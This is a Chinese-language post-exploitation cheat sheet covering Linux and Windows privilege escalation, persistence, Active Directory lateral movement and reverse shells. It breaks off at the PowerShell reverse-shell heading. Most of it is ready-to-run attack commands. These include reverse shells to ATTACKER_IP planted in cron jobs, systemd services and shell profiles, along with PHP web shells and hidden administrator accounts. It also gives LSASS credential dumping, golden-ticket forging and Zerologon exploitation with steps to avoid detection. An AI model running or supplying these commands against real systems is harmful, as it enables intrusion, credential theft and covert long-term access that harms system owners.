# Getshell 后提权与后渗透实战速查手册

> 最后更新: 2026-06-20
> 适用场景: 已获得初始 Shell (www-data / IIS APPPOOL / service account) 后的提权、维持访问、横向移动全链路

---

## 目录

1. [Linux 提权](#1-linux-提权)
2. [Windows 提权](#2-windows-提权)
3. [维持访问](#3-维持访问)
4. [横向移动](#4-横向移动)
5. [反弹 Shell 变种速查](#5-反弹-shell-变种速查)
6. [2025-2026 最新 CVE](#6-2025-2026-最新-cve)
7. [自动化工具速查](#7-自动化工具速查)

---

## 1. Linux 提权

### 1.1 信息收集 (第一时间执行)

```bash
# === 用户与权限 ===
whoami && id && hostname
sudo -l                        # 最重要 — 30%+ 目标直接出 root
cat /etc/passwd | grep -v nologin   # 有 shell 的用户

# === SUID / SGID 二进制 ===
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
find / -perm -6000 -type f 2>/dev/null

# === Capabilities ===
getcap -r / 2>/dev/null

# === Cron 任务 ===
cat /etc/crontab
ls -la /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
ls -la /etc/cron.d/
crontab -l 2>/dev/null
systemctl list-timers --all

# === 内核 ===
uname -a && cat /etc/os-release && cat /proc/version

# === 网络与进程 ===
ip a; route -n; ss -tlnp
ps aux | grep root
cat /etc/exports                # NFS 共享

# === 敏感文件 ===
find / -writable -type f 2>/dev/null | grep -v proc
ls -la /var/run/docker.sock 2>/dev/null
find / -name "id_rsa" -o -name "*.pem" -o -name "authorized_keys" 2>/dev/null
cat ~/.bash_history; cat /root/.bash_history 2>/dev/null

# === 自动枚举 (LinPEAS) ===
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/lp.sh
chmod +x /tmp/lp.sh && /tmp/lp.sh | tee /tmp/linpeas-out.txt
```

### 1.2 提权优先级检查清单

```
1. sudo -l                    ← 一击 root (30%+)
2. SUID 二进制 → GTFOBins      ← 最常见
3. capabilities (getcap)       ← 常被忽略
4. Cron 可写脚本 / PATH 劫持   ← 1 分钟内见效
5. Docker / LXD 组             ← 即时 root
6. /etc/passwd 可写            ← 直接加用户
7. 内核 exploit                ← 最后手段 (可能死机)
```
### 1.3 Sudo 配置错误利用

**原理**: `sudo -l` 列出当前用户可执行的命令，通过 [GTFOBins](https://gtfobins.github.io/) 对应的利用手法直接提权。

| 二进制 | 提权命令 |
|--------|---------|
| `vim` | `sudo vim -c ':!/bin/bash'` |
| `less` / `more` | `sudo less /etc/profile` 然后输入 `!/bin/sh` |
| `find` | `sudo find . -exec /bin/bash \;` |
| `nmap` (旧版) | `sudo nmap --interactive` 然后 `!sh` |
| `python` | `sudo python3 -c 'import os; os.system("/bin/bash")'` |
| `awk` | `sudo awk 'BEGIN {system("/bin/bash")}'` |
| `env` | `sudo env /bin/bash` |
| `perl` | `sudo perl -e 'exec "/bin/bash"'` |
| `ruby` | `sudo ruby -e 'exec "/bin/bash"'` |
| `lua` | `sudo lua -e 'os.execute("/bin/bash")'` |
| `zip` | `TF=$(mktemp -u); sudo zip $TF /etc/hosts -T -TT 'sh #'` |
| `tar` | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash` |
| `git` | `sudo PAGER='sh -c "exec sh 0<&1"' git -p help` |
| `man` | `sudo man man` 然后 `!/bin/bash` |
| `tcpdump` | 利用 `-z` postrotate-command 参数 |
| `base64` | `sudo base64 /etc/shadow \| base64 -d` (读敏感文件) |
| `cp` | 覆盖 `/etc/passwd` 或 `/etc/shadow` |
| `mount` | `sudo mount -o bind /bin/bash /bin/mount && sudo mount` |
| `systemctl` | `sudo systemctl` 然后 `!sh` |
| `ssh` | `sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x` |
| `apt-get` / `apt` | `sudo apt-get changelog apt` 然后 `!/bin/bash` |
| `pip` | `sudo pip install .` 配合恶意 `setup.py` |
| `node` | `sudo node -e 'require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})'` |

**LD_PRELOAD 劫持** (当 `sudo -l` 显示 `env_keep+=LD_PRELOAD`):

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash");
}
```
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so find
```

**Tcpdump 利用 (-z 参数)**:

```bash
# 攻击机: nc -lvnp 4444
echo 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f' > /tmp/.test
chmod +x /tmp/.test
sudo /usr/sbin/tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

### 1.4 SUID 二进制利用

**查找 SUID 二进制**:
```bash
find / -perm -4000 -type f 2>/dev/null
# 对照 GTFOBins 逐一尝试
```

**常见 SUID 利用**:

```bash
# bash (带 -p 保留特权)
bash -p

# python
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# find
find . -exec /bin/sh -p \; -quit

# vim
vim -c ':!/bin/bash'

# cp — 覆写 /etc/passwd
openssl passwd -1 -salt evil pass123
echo 'evil:$1$evil$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su evil

# env
env /bin/bash -p

# base64 — 读取任意文件
base64 /etc/shadow | base64 -d

# php
php -r "system('/bin/bash -p');"

# ruby
ruby -e 'Process.exec("/bin/bash -p")'
```

### 1.5 Capabilities 提权

**枚举**:
```bash
getcap -r / 2>/dev/null
```

**危险 Capabilities 速查**:

| Capability | 利用方式 |
|-----------|---------|
| `cap_setuid=ep` | 直接 `setuid(0)` 提权 |
| `cap_setgid=ep` | 设置 GID 为 root 组 |
| `cap_dac_override=ep` | 绕过所有文件权限检查 |
| `cap_dac_read_search=ep` | 任意文件读权限 |
| `cap_sys_admin` | 挂载文件系统、namespace 操作 |
| `cap_sys_ptrace` | 注入 root 进程 |
| `cap_sys_module` | 加载内核模块 |
| `cap_net_admin` | 网络配置修改 |
| `cap_net_raw` | raw socket (可发包) |
| `cap_fowner=ep` | 修改任意文件属主 |
| `cap_chown=ep` | 修改任意文件属主 |

**Python with cap_setuid**:
```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Perl with cap_setuid**:
```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

**OpenSSL with cap_setuid (读 /etc/shadow)**:
```bash
/usr/bin/openssl enc -d -in /etc/shadow
```

### 1.6 Cron 任务劫持

**手法一: 可写 Cron 脚本**
```bash
# 如果 /opt/scripts/backup.sh 全局可写且 root 运行:
echo 'chmod +s /bin/bash' >> /opt/scripts/backup.sh
# 等待 <=60 秒后:
/bin/bash -p
```

**手法二: Tar 通配符注入 (Wildcard Injection)**
当 cron 执行 `tar -zcf backup.tar.gz *` 时:
```bash
cd /path/to/cron/directory
echo 'echo "user ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > privesc.sh
chmod +x privesc.sh
echo "" > "--checkpoint-action=exec=sh privesc.sh"
echo "" > --checkpoint=1
# tar 遇到这些"文件名"时会执行 checkpoint-action
```

**手法三: PATH 劫持**
```bash
# 如果 cron 脚本调用 "curl" 而非 "/usr/bin/curl"
echo '#!/bin/bash' > /tmp/curl
echo '/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /tmp/curl
chmod +x /tmp/curl
export PATH=/tmp:$PATH
```

### 1.7 Docker 组提权

**检测**:
```bash
id                    # 查找 docker 组
ls -la /var/run/docker.sock    # socket 可访问?
```

**宿主机文件系统挂载** (最直接):
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
```

**通过 Docker Socket (容器内)**:
```bash
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run --rm -d --privileged -v /:/hostsystem alpine
docker -H unix:///var/run/docker.sock exec -it <container-id> /bin/bash
cd /hostsystem/root
```

### 1.8 LXD/LXC 组提权

```bash
id | grep lxd
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder && ./build-alpine
lxc image import alpine.tar.gz --alias pwn
lxc init pwn pwnbox -c security.privileged=true
lxc config device add pwnbox host-root disk source=/ path=/mnt/root recursive=true
lxc start pwnbox
lxc exec pwnbox /bin/sh
cd /mnt/root/root    # 宿主机 root 文件系统
```

### 1.9 NFS no_root_squash 提权

```bash
cat /etc/exports
showmount -e TARGET_IP
mkdir /tmp/nfs && mount -o rw TARGET_IP:/share /tmp/nfs
cd /tmp/nfs
cp /bin/bash . && chmod +s bash
# 在目标机上执行该 bash -p 即可 root
```

### 1.10 /etc/passwd 可写

```bash
ls -la /etc/passwd
# 如果可写:
openssl passwd -1 -salt evil password123
echo 'evil:$1$evil$GENERATED_HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su evil
```

### 1.11 内核 Exploit (最后手段)

```bash
uname -r
searchsploit linux kernel $(uname -r | cut -d. -f1-2)
```

**经典内核提权 CVE**:
- CVE-2016-5195 (DirtyCow) — 内核 2.6.22-4.8.3
- CVE-2021-4034 (PwnKit) — polkit pkexec 全版本 < 0.120
- CVE-2021-3156 (Baron Samedit) — sudo 1.8.2-1.9.5p1
- CVE-2022-0847 (Dirty Pipe) — 内核 5.8-5.16.11
- CVE-2023-0386 (OverlayFS) — 内核 5.11-6.1
- CVE-2023-4911 (Looney Tunables) — glibc ld.so
- CVE-2026-31431 (Copy Fail) — 内核 4.14+ 至 2026 年初

**PwnKit (CVE-2021-4034) — 成功率最高**:
```bash
curl -L https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o /tmp/PwnKit
chmod +x /tmp/PwnKit && /tmp/PwnKit
```

### 1.12 MySQL UDF 提权

**条件**: MySQL root 密码已知, `secure_file_priv` 为空, 插件目录可写

```sql
SHOW VARIABLES LIKE '%plugin%';
SELECT @@plugin_dir;
-- 写入 raptor_udf2.so
SELECT 0x... INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'raptor_udf2.so';
SELECT sys_exec('chmod +s /bin/bash');
```

### 1.13 SSH Agent Forwarding 劫持

```bash
env | grep SSH_AUTH_SOCK
ls -la /tmp/ssh-*
SSH_AUTH_SOCK=/tmp/ssh-XXX/agent.NNN ssh user@target
```

### 1.14 History / 日志中搜索凭据

```bash
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history
cat /root/.bash_history 2>/dev/null
grep -rni "password\|passwd\|secret\|token\|api_key\|jdbc" ~/.*history 2>/dev/null
grep -rni "password\|username\|jdbc" /var/log/ 2>/dev/null | head -20
grep -rni "password\|username\|jdbc" /opt/ 2>/dev/null | head -20
```



---

## 2. Windows 提权

### 2.1 信息收集 (第一时间执行)

```cmd
REM === 用户与权限 ===
whoami /all
whoami /priv
whoami /groups
net user %username%
net localgroup Administrators

REM === 系统信息 ===
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic os get osarchitecture

REM === 网络与进程 ===
ipconfig /all
route print
netstat -ano
tasklist /svc

REM === 服务与计划任务 ===
sc query state= all
wmic service get name,displayname,pathname,startmode | findstr /i "auto"
schtasks /query /fo LIST /v

REM === AlwaysInstallElevated ===
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

REM === 自动审计 ===
REM WinPEAS: https://github.com/carlospolop/PEASS-ng/releases
WinPEASx64.exe
REM Seatbelt
Seatbelt.exe -group=all
```

### 2.2 提权优先级检查清单

```
1. whoami /priv -> SeImpersonate/SeAssignPrimaryToken -> Potato 系列
2. UAC 绕过 -> 已在 Administrators 组但 Medium Integrity
3. AlwaysInstallElevated -> 恶意 MSI
4. 服务权限 -> 可写服务二进制/未引用路径
5. DLL 劫持 -> ProcMon 检测
6. SeBackup/SeDebug/SeTakeOwnership -> 专用手法
7. 计划任务劫持
8. 内核 exploit
```

### 2.3 Potato 系列 — SeImpersonate 提权

**检测**:
```cmd
whoami /priv | findstr "SeImpersonatePrivilege"
whoami /priv | findstr "SeAssignPrimaryTokenPrivilege"
```

| 工具 | 适用版本 | 特点 |
|------|---------|------|
| **PrintSpoofer** | Win10 1607+, Server 2016-2022 | 最推荐，Pipe Impersonation + Print Spooler |
| **GodPotato** | Server 2012-2022, Win8-Win11 | DCOM + RPC，适合现代/已打补丁系统 |
| **JuicyPotato** | Win7/8/10 <1809, Server 2008-2016 | 已修复于 Win10 1809+，老系统首选 |
| **RoguePotato** | Win10 1809+, Server 2019+ | 需攻击机 socat 转发 |
| **RustPotato** | Modern Windows | Rust 重写 GodPotato，内置反弹 Shell |
| **SweetPotato** | Win7-Server 2019 | 综合 COM/WinRM/Spoolsv 多种技术 |
| **EfsPotato** | Win10/11 | 利用 EFS RPC 接口 |

**PrintSpoofer**:
```cmd
PrintSpoofer.exe -i -c cmd.exe
PrintSpoofer.exe -c "powershell -e BASE64_ENCODED_COMMAND"
```

**GodPotato**:
```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "nc.exe -e cmd.exe ATTACKER_IP 4444"
```

**JuicyPotato (老系统)**:
```cmd
JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337
JuicyPotato.exe -l 1340 -p cmd.exe -t * -c {CLSID} -a "/c nc.exe ATTACKER_IP 443 -e cmd"
```

**RoguePotato (需攻击机转发)**:
```cmd
REM 攻击机: socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
RoguePotato.exe -r ATTACKER_IP -e "nc.exe ATTACKER_IP 443 -e cmd" -l 9999
```

> **故障排查**: PrintSpoofer 静默失败时检查是否需要 `VCRUNTIME140.dll`。

### 2.4 UAC 绕过

**条件**: 已属于 Administrators 组，但处于 Medium Integrity

**Fodhelper 绕过 (Win10/11)**:
```cmd
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "cmd.exe /c start powershell.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
start C:\Windows\System32\fodhelper.exe
```

**Eventvwr 绕过**:
```cmd
reg add HKCU\Software\Classes\mscfile\shell\open\command /ve /d "cmd.exe" /f
start eventvwr.exe
```

**其他 UAC 绕过**: sdclt.exe, slui.exe, SilentCleanup 计划任务
**Metasploit**: `exploit/windows/local/bypassuac` / `bypassuac_fodhelper` / `bypassuac_eventvwr`

### 2.5 AlwaysInstallElevated

**检测** (两边都必须为 0x1):
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**利用**:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACK_IP LPORT=4444 -f msi -o evil.msi
```
```cmd
msiexec /quiet /qn /i evil.msi
```

### 2.6 服务权限提升

**未引用服务路径 (Unquoted Service Path)**:
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /v /i "C:\Windows" | findstr /v /i """"
```
如果出现 `C:\Program Files\My App\service.exe` 且目录可写，在空格前位置放置恶意程序:
```cmd
copy C:\Temp\shell.exe "C:\Program Files\My.exe"
net stop "ServiceName" && net start "ServiceName"
```

**可写服务二进制替换**:
```cmd
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
sc config ServiceName binPath= "C:\Temp\shell.exe"
sc stop ServiceName && sc start ServiceName
```

### 2.7 DLL 劫持

用 ProcMon 监控服务进程 DLL 加载，筛选 `NAME NOT FOUND` + 用户可写路径，放置恶意 DLL (`msfvenom -f dll`)，重启服务触发。

### 2.8 SeBackup / SeDebug / SeTakeOwnership 提权

**SeBackupPrivilege**:
```cmd
reg save hklm\sam C:\Temp\sam
reg save hklm\system C:\Temp\system
REM 下载后用: impacket-secretsdump -sam sam -system system LOCAL
```

**SeDebugPrivilege**:
```cmd
mimikatz.exe "privilege::debug" "token::elevate" "exit"
```

**SeTakeOwnershipPrivilege**:
```cmd
takeown /f C:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant Everyone:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
REM 登录界面点击"轻松使用" -> SYSTEM shell
```

### 2.9 LSASS Dump — 凭据提取

**Mimikatz (需要 SYSTEM)**:
```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
mimikatz.exe "privilege::debug" "lsadump::lsa /patch" "exit"
mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
```

**ProcDump + Mimikatz (更安全)**:
```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
```

**comsvcs.dll (无工具 dump)**:
```powershell
Get-Process lsass | ForEach-Object { rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $_.Id $env:TEMP\lsass.dmp full }
```

**其他工具**: NanoDump (Cobalt Strike BOF), PPLdump (绕过 LSASS PPL 保护), HandleKatz

### 2.10 Sticky Keys (物理/RDP 访问)

```cmd
REM 替换粘滞键 -> 登录界面按 Shift 5 次 -> SYSTEM shell
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
REM 替换轻松使用
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```



---

## 3. 维持访问

### 3.1 Linux 维持访问

**SSH Key 写入**:
```bash
ssh-keygen -t rsa -b 4096 -f backdoor_key -N ""
mkdir -p /root/.ssh 2>/dev/null
echo "ssh-rsa AAA... backdoor" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
# 批量加到所有用户
for user_dir in /home/*; do
    mkdir -p $user_dir/.ssh
    echo "ssh-rsa AAA..." >> $user_dir/.ssh/authorized_keys
    chmod 600 $user_dir/.ssh/authorized_keys
done
```

**Crontab 后门**:
```bash
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1") | crontab -
echo "*/5 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" >> /etc/crontab
echo "*/10 * * * * root /usr/share/man/man1/.cache 2>/dev/null" >> /etc/cron.d/system-update
```

**Systemd 持久化**:
```bash
cat > /etc/systemd/system/systemd-networkd.service << EOF
[Unit]
Description=System Network Service
After=network.target
[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1; sleep 60; done'
Restart=always
RestartSec=30
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable systemd-networkd.service
systemctl start systemd-networkd.service
```

**PAM 后门 (捕获密码)**:
```bash
cp /lib/x86_64-linux-gnu/security/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so.bak
# 编译 PAM 后门记录所有登录密码: https://github.com/zephrax/linux-pam-backdoor
```

**LD_PRELOAD Rootkit** (隐藏进程/文件/连接):
```bash
echo "/usr/lib/libsystemd.so.1" >> /etc/ld.so.preload
# 需编译 hook open/readdir/connect 等系统调用的 .so 文件
```

**Motd / Profile 后门**:
```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &' >> /etc/update-motd.d/00-header
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &' >> /etc/profile
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &' >> ~/.bashrc
```

**Web Shell (PHP 一句话)**:
```bash
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/.css.php
echo '<?php eval($_POST["x"]); ?>' > /var/www/html/.cache.php
```

### 3.2 Windows 维持访问

**计划任务**:
```powershell
schtasks /create /tn "WindowsUpdate" /tr "powershell -e BASE64" /sc minute /mo 5 /ru SYSTEM /f
schtasks /create /tn "SystemMaintenance" /tr "C:\Windows\Temp\update.exe" /sc onlogon /ru SYSTEM /f
```

**WMI 事件订阅 (无文件持久化)**:
```powershell
$FilterArgs = @{
    Name='SystemStartFilter'
    EventNameSpace='root\cimv2'
    QueryLanguage='WQL'
    Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120"
}
$Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{
    Name='SystemStartConsumer'
    CommandLineTemplate='powershell.exe -e BASE64_ENCODED_COMMAND'
}
$Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

$BindingArgs = @{ Filter=$Filter; Consumer=$Consumer }
Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
```

**COM 劫持**:
```powershell
$CLSID = "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"
New-Item -Path "HKCU:\Software\Classes\CLSID\$CLSID\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$CLSID\InprocServer32" -Name "(default)" -Value "C:\Windows\Temp\evil.dll"
```

**注册表 Run Key**:
```powershell
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "OneDrive" -Value "powershell.exe -e BASE64" -Force
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityHealth" -Value "C:\Windows\Temp\update.exe" -Force
# RunOnce
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "Setup" -Value "C:\Windows\Temp\beacon.exe" -Force
```

**Windows 服务**:
```cmd
sc create "WindowsUpdateSvc" binPath= "C:\Windows\Temp\payload.exe" start= auto
sc description "WindowsUpdateSvc" "Windows Update Service"
sc start "WindowsUpdateSvc"
```

**RDP 后门**:
```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
net user sysadmin P@ssw0rd123! /add
net localgroup Administrators sysadmin /add
net localgroup "Remote Desktop Users" sysadmin /add
REM 隐藏用户
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v sysadmin /t REG_DWORD /d 0 /f
```

**端口转发**:
```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=3389 connectaddress=127.0.0.1
```



---

## 4. 横向移动

### 4.1 Pass-The-Hash (PtH)

**条件**: 拥有目标用户的 NTLM Hash

```bash
# Impacket
impacket-psexec -hashes :NTLM_HASH DOMAIN/user@TARGET_IP
impacket-wmiexec -hashes :NTLM_HASH DOMAIN/user@TARGET_IP
impacket-smbexec -hashes :NTLM_HASH DOMAIN/user@TARGET_IP
impacket-atexec -hashes :NTLM_HASH DOMAIN/user@TARGET_IP "whoami"

# Evil-WinRM (WinRM 5985)
evil-winrm -i TARGET_IP -u user -H NTLM_HASH

# NetExec
nxc smb TARGET_IP -u user -H NTLM_HASH -x "whoami"
nxc smb TARGET_IP -u user -H NTLM_HASH --exec-method wmiexec -X "powershell -e BASE64"

# Mimikatz (在已控机器上)
sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:NTLM_HASH /run:cmd.exe
```

**防御**: 监控 Event ID 4624 (LogonType 3 + NTLM), Credential Guard, LAPS

### 4.2 Pass-The-Ticket (PtT)

```cmd
REM Mimikatz 导出所有 ticket
sekurlsa::tickets /export
REM 导入 ticket
kerberos::ptt ticket.kirbi
```

### 4.3 Kerberoasting

**条件**: 任意域用户 (不需要高权限)

```bash
# Impacket
impacket-GetUserSPNs DOMAIN/user:password -dc-ip DC_IP -request -outputfile hashes.kerberoast

# NetExec
nxc ldap DC_IP -u user -p password --kerberoasting kerberoast.txt

# Rubeus (Windows)
Rubeus.exe kerberoast /outfile:hashes.txt

# 离线破解 (hashcat mode 13100)
hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule --force
```

**防御**: 服务账户 25+ 字符强密码、gMSA、AES-only 加密

### 4.4 AS-REP Roasting

```bash
# 枚举无需预认证的用户
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC_IP -format hashcat

# 破解 (hashcat mode 18200)
hashcat -m 18200 asrep.txt rockyou.txt --force
```

### 4.5 DCSync

**条件**: Replicating Directory Changes 权限 (DA/EA/特定委派)

```bash
# Impacket
impacket-secretsdump DOMAIN/AdminUser:Password@DC_IP -just-dc-ntlm

# Mimikatz
lsadump::dcsync /domain:DOMAIN /user:Administrator
lsadump::dcsync /domain:DOMAIN /user:krbtgt    # 获取 KRBTGT hash
lsadump::dcsync /domain:DOMAIN /all
```

### 4.6 黄金票据 (Golden Ticket)

**条件**: KRBTGT NTLM Hash + Domain SID + Domain FQDN

```cmd
REM Mimikatz 生成黄金票据 (可冒充任意用户、设置超长有效期)
kerberos::golden /domain:DOMAIN.FQDN /sid:S-1-5-21-XXXX /krbtgt:KRBTGT_HASH /user:FakeAdmin /id:500 /ptt
REM 带 Domain Admins (512)
kerberos::golden /domain:DOMAIN.FQDN /sid:S-1-5-21-XXXX /krbtgt:HASH /user:anyuser /id:500 /groups:512 /ptt
REM 10年有效期 (87600 小时)
kerberos::golden /domain:DOMAIN.FQDN /sid:S-1-5-21-XXXX /krbtgt:HASH /user:admin /id:500 /endin:87600 /renewmax:100000 /ptt
```

**特点**: 可离线生成、冒充不存在/禁用账户、审计痕迹极少、Microsoft 无法从根本上修复

### 4.7 白银票据 (Silver Ticket)

**条件**: 目标服务 Machine Account NTLM Hash + Domain SID

```cmd
REM CIFS (文件共享)
kerberos::golden /domain:DOMAIN.FQDN /sid:S-1-5-21-XXXX /target:SERVER.DOMAIN.FQDN /service:cifs /rc4:MACHINE_HASH /user:admin /id:500 /ptt
REM HOST (计划任务/WMI)
kerberos::golden /domain:DOMAIN.FQDN /sid:S-1-5-21-XXXX /target:SERVER.DOMAIN.FQDN /service:HOST /rc4:MACHINE_HASH /user:admin /id:500 /ptt
REM HTTP (WinRM)
kerberos::golden /domain:DOMAIN.FQDN /sid:S-1-5-21-XXXX /target:SERVER.DOMAIN.FQDN /service:HTTP /rc4:MACHINE_HASH /user:admin /id:500 /ptt
```

### 4.8 NTLM Relay

**攻击机启动 Relay**:
```bash
# SMB Relay -> shell
impacket-ntlmrelayx -tf targets.txt -smb2support

# LDAP Relay -> 添加 ACL 权限
impacket-ntlmrelayx -t ldaps://DC_IP --delegate-access

# ADCS HTTP Relay (ESC8) -> 证书 -> Domain Admin
impacket-ntlmrelayx -t http://CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

**强制认证 (Coercion)**:
```bash
impacket-printerbug DOMAIN/user:password@TARGET_IP ATTACKER_IP
python3 PetitPotam.py -d DOMAIN -u user -p password ATTACKER_IP TARGET_IP   # CVE-2021-36942
python3 dfscoerce.py -d DOMAIN -u user -p password ATTACKER_IP TARGET_IP
python3 shadowcoerce.py -d DOMAIN -u user -p password ATTACKER_IP TARGET_IP
```

**防御**: SMB 签名、LDAP 签名 + Channel Binding、EPA

### 4.9 Zerologon (CVE-2020-1472)

```bash
# 检测
python3 zerologon_tester.py DC_NAME DC_IP

# 利用 -> DC 机器账户密码置空
python3 cve-2020-1472-exploit.py DC_NAME DC_IP

# Dump 所有域 hash
impacket-secretsdump -just-dc DOMAIN/DC_NAME\$@DC_IP -no-pass

# 恢复原始密码 (避免检测)
python3 restorepassword.py DOMAIN/DC_NAME@DC_IP -target-ip DC_IP -hexpass ORIGINAL_HEX_PASS
```

### 4.10 PowerShell Remoting (WinRM 5985)

```powershell
$cred = New-Object System.Management.Automation.PSCredential("DOMAIN\user", (ConvertTo-SecureString "password" -AsPlainText -Force))
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami }
Enter-PSSession -ComputerName TARGET -Credential $cred
```

### 典型 AD 攻击链 (2025-2026)

```
初始立足点 -> LSASS dump -> PtH/PtT 横向
    -> Kerberoasting -> 破解服务账户 -> 更多横向
    -> DCSync -> KRBTGT hash
    -> Golden Ticket -> 永久域持久化
    -> 勒索/数据外泄
```



---

## 5. 反弹 Shell 变种速查

### 5.1 Bash

```bash
# TCP
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
bash -c 'exec bash -i &>/dev/tcp/ATTACKER_IP/PORT <&1'

# UDP (攻击机: nc -u -lvnp PORT)
sh -i >& /dev/udp/ATTACKER_IP/PORT 0>&1

# 加密 OpenSSL
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_IP:PORT > /tmp/s; rm /tmp/s
```

### 5.2 Python

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
```

### 5.3 PHP

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'"); ?>
<?php $s=fsockopen("ATTACKER_IP",PORT);exec("/bin/bash <&3 >&3 2>&3"); ?>
<?php system($_GET["cmd"]); ?>    <!-- 一句话 Web Shell -->
```

### 5.4 PowerShell (Windows)

```powershell
# TCP 反弹 (一行版)
